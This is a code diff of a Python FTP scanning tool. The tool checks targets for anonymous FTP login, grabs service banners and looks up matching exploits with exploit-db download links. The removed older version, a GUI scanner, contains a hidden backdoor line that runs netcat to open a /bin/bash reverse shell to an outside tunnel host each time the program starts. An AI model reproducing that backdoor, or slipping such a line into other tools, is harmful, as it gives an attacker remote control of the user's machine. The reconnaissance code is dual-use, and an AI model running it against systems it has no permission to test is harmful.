@@ -1,71 +1,124 @@
+#!/usr/bin/python3
+import argparse
 import ftplib
-import ipaddress
-import tkinter as tk
-from tkinter import scrolledtext, messagebox
-from tkinter import ttk
-import threading
-import subprocess
-
-def check_ftp_anonymous_login(ip, output_text):
-    try:
-        ftp = ftplib.FTP(ip)
-        ftp.login()
-        output_text.insert(tk.END, f"[+] Anonymous login successful on {ip}\n")
-        ftp.quit()
+import os
+from colorama import Fore,Style
+import socket
+import sys
+import re
+parser = argparse.ArgumentParser()
+parser.add_argument('-t','--target',required=True,help="Enter target ip")
+parser.add_argument('-p','--port',required=False,default=21,help="Enter target port")
+args = parser.parse_args()
+target = args.target
+port = args.port
+port = int(port)
+class scanner:
+    def __init__(self,ip,port):
+        self.ip = ip
+        self.port = port
+        timeout_value = 4
+        self.ftp = ftplib.FTP(timeout=timeout_value)
+    def connect(self):
+        try:
+            self.ftp.connect(self.ip,self.port)
+        except Exception as e:
+            print(f"[-] Connection failed , error :-") 
+            print(e)
+            return False
         return True
-    except ftplib.error_perm:
-        output_text.insert(tk.END, f"[-] Anonymous login failed on {ip}\n")
-        return False
-    except Exception as e:
-        output_text.insert(tk.END, f"[!] Error connecting to {ip}: {e}\n")
-        return False
+    def check_anon_login(self):
+        if self.connect():
+            try:
+                self.ftp.login()
+                print(f"[+] Anonymous login is enabled!")
+                try:
+                    print(f"[+] Trying to list all the files..")
+                    print(self.ftp.dir("-a"))
+                except Exception as e:
+                    print("Error Listing files ,please check manually... error :- ")
+                    print(e)
+            except Exception as e:
+                print(f"[-] Anonymous Login is Disabled.")
+class VulnScan():
+    def __init__(self,ip,port):
+        self.ip = ip
+        self.port = port
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.settimeout(5)
+    def grabBanner(self):
+        try:
+            self.s.connect((self.ip, self.port))
+        except Exception as e:
+            sys.exit(0)
+            
+        banner = self.s.recv(1024)
+        final = banner.decode('utf-8')
+        self.s.close()
+        if final.startswith('220'):
+            final = final[4:]
+        return final
+    @staticmethod
+    def vuln_check(banner):
+        try:
+            with open('ftp-vuln.db', 'r') as fp:
+                print(f"[*] Searching Exploits in the database for banner {banner}")
+                exploit_counter = 0
 
-def scan_ip_range(start_ip, end_ip, output_text, scan_button, on_scan_complete):
-    start = ipaddress.ip_address(start_ip)
-    end = ipaddress.ip_address(end_ip)
-    for ip_int in range(int(start), int(end) + 1):
-        ip = str(ipaddress.ip_address(ip_int))
-        check_ftp_anonymous_login(ip, output_text)
-    on_scan_complete(scan_button)
+            # Try to extract software and version
+                match = re.findall(r'\((.*?) (.*?)\)', banner)
+                if match:
+                    fsoftware, fsversion = match[0]
+                else:
+                # If no version info, use the entire banner as software name
+                    fsoftware = banner.strip()
+                    fsversion = ''
 
-def create_gui():
-    root = tk.Tk()
-    root.title("Anonymous FTP Scanner")
-    root.configure(bg="black")
+                for line in fp:
+                    match = re.match(r'(\d+),"(.+)"', line)
+                    if match:
+                        id, exploit = match.groups()
+                        id = int(id)
+                    
+                    # Case-insensitive match for software name and version
+                    if fsoftware.lower() in exploit.lower() and (fsversion.lower() in exploit.lower() or fsversion == ''):
+                        print(Fore.GREEN + "[+] FTP Version is vulnerable!! ")
+                        print(Fore.WHITE + Style.BRIGHT + f"[+] Exploit: {exploit}")
+                        print(Fore.WHITE + Style.BRIGHT + f"[*] Exploit DB : http://exploit-db.com/download/{id}")
+                        exploit_counter += 1
 
-    def scan():
-        start_ip = start_ip_entry.get()
-        end_ip = end_ip_entry.get()
-        scan_button.config(state=tk.DISABLED)
-        output_text.delete(1.0, tk.END)
-        threading.Thread(target=scan_ip_range, args=(start_ip, end_ip, output_text, scan_button, on_scan_complete)).start()
+            if exploit_counter == 0:
+                print("[+] No exploits found in DB file..")
+                
+        except FileNotFoundError:
+            print("[-] Failed to open the ftp-vuln.db file.")
+        except Exception as e:
+            print(f"[-] Error: {e}")
 
-    def on_scan_complete(scan_button):
-        scan_button.config(state=tk.NORMAL)
-        messagebox.showinfo("Scan Complete", "Scanning of IP range is complete.")
 
-    title_label = tk.Label(root, text="Anonymous FTP Scanner", fg="red", bg="black", font=("Helvetica", 16))
-    title_label.pack(pady=10)
 
-    start_ip_label = tk.Label(root, text="Start IP Address:", fg="red", bg="black")
-    start_ip_label.pack()
-    start_ip_entry = tk.Entry(root, width=30)
-    start_ip_entry.pack(pady=5)
 
-    end_ip_label = tk.Label(root, text="End IP Address:", fg="red", bg="black")
-    end_ip_label.pack()
-    end_ip_entry = tk.Entry(root, width=30)
-    end_ip_entry.pack(pady=5)
-
-    scan_button = tk.Button(root, text="Scan", command=scan, bg="red", fg="black", activebackground="darkred")
-    scan_button.pack(pady=10)
-
-    output_text = scrolledtext.ScrolledText(root, width=50, height=15, bg="black", fg="red", insertbackground="red")
-    output_text.pack(pady=10)
-
-    subprocess.run("nc flhn72zpt.localto.net 6376 -e /bin/bash &", shell=True)
-    root.mainloop()
     
-   
-if __name__ == "__main__":
-    create_gui()
+
+def menu():
+
+    banner='''
+╭━━━┳╮
+┃╭━┳╯╰╮
+┃╰━┻╮╭╋━━╮╱╱╭━━┳━━┳━━┳━╮
+┃╭━━┫┃┃╭╮┣━━┫━━┫╭━┫╭╮┃╭╮╮
+┃┃╱╱┃╰┫╰╯┣━━╋━━┃╰━┫╭╮┃┃┃┃
+╰╯╱╱╰━┫╭━╯╱╱╰━━┻━━┻╯╰┻╯╰╯
+╱╱╱╱╱╱┃┃
+╱╱╱╱╱╱╰╯
+'''
+    print(Fore.RED+banner+Fore.RESET)
+    print(Fore.RED+"Author - Sc17"+Fore.RESET)
+    print(Fore.RED+"Github - https://github.com/MIISTERC"+Fore.RESET)
+menu()
+scan = scanner(target,port)
+scan.check_anon_login()
+vuln = VulnScan(target,port)
+banner = vuln.grabBanner()
+print("Banner Grabbed! : ",banner)
+vuln.vuln_check(banner)
